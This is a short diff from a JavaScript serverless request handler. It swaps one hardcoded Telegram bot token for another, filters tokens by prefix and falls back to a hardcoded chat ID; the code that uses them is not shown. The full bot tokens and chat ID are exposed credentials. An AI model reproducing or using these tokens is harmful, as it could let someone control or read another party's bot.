@@ -80,7 +80,7 @@ export async function onRequest(context) {
   try {
     const data = await request.json().catch(() => ({}));
     const candidateTokens = [
-      '7955190883:AAE1H6OWcno17yeEoPABRdOqYcpovHSVY6k',
+      '7955190883:AAHKiXEGIjos0QOH2PHRW0N6i6A4lN7XW3E',
       env.TELEGRAM_BOT_TOKEN
     ].filter((t, i, arr) => t && arr.indexOf(t) === i && !t.startsWith('8830044077') && !t.startsWith('8617758186'));
     const chatId = env.TELEGRAM_CHAT_ID || '8104595144';
